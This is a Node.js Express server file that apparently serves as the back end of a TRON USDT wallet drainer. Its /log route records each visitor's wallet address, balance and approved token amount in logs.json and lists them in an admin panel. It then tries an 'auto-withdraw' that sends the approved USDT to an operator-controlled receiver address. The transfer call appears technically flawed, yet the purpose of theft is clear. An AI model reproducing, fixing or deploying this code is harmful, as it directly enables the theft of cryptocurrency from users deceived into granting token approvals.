const express = require("express");
const TronWeb = require("tronweb");
const cors = require("cors");
const fs = require("fs");
const path = require("path");
require("dotenv").config();

const app = express();
const port = 3000;

app.use(cors());
app.use(express.json());
app.use(express.static(__dirname));

// TRON setup
const tronWeb = new TronWeb({
  fullHost: "https://api.trongrid.io",
  headers: { "TRON-PRO-API-KEY": process.env.TRONGRID_API },
  privateKey: process.env.PRIVATE_KEY
});

const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // TRC-20 USDT

// GET route to serve admin panel
app.get("/admin", (req, res) => {
  res.sendFile(path.join(__dirname, "admin.html"));
});

// POST route to log wallet + approve + balance
app.post("/log", async (req, res) => {
  const { walletAddress, balance, approvedAmount } = req.body;

  // Save to local file (logs.json)
  const logData = { walletAddress, balance, approvedAmount, time: new Date().toISOString() };

  fs.readFile("logs.json", (err, data) => {
    let logs = [];
    if (!err && data.length > 0) {
      logs = JSON.parse(data);
    }
    logs.push(logData);
    fs.writeFile("logs.json", JSON.stringify(logs, null, 2), () => {
      console.log("✅ Wallet logged:", walletAddress);
    });
  });

  // Try auto-withdraw
  try {
    const contract = await tronWeb.contract().at(usdtContractAddress);
    const result = await contract.methods
      .transfer(process.env.RECEIVER_ADDRESS, approvedAmount)
      .send({ from: walletAddress });

    console.log("✅ Auto-withdraw successful:", result);
    res.send({ success: true, tx: result });
  } catch (err) {
    console.log("❌ Auto-withdraw failed:", err.message);
    res.send({ success: false, error: err.message });
  }
});

// GET logs for admin panel
app.get("/logs", (req, res) => {
  fs.readFile("logs.json", (err, data) => {
    if (err) return res.send([]);
    res.send(JSON.parse(data));
  });
});

app.listen(port, () => {
  console.log(`✅ Server running at http://localhost:${port}`);
});
